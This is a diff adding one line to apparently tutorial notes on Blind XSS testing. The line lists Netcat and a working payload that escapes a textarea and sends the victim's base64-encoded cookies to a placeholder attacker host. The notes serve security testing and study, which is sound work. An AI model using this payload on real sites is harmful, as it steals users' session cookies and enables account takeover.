@@ -130,3 +130,4 @@ When testing for Blind XSS vulnerabilities, you need to ensure your payload has 
 
 A popular tool for Blind XSS attacks is XSS Hunter Express(3). Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
 
+Tools : Netcat , https://www.base64decode.org/, </textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script> 
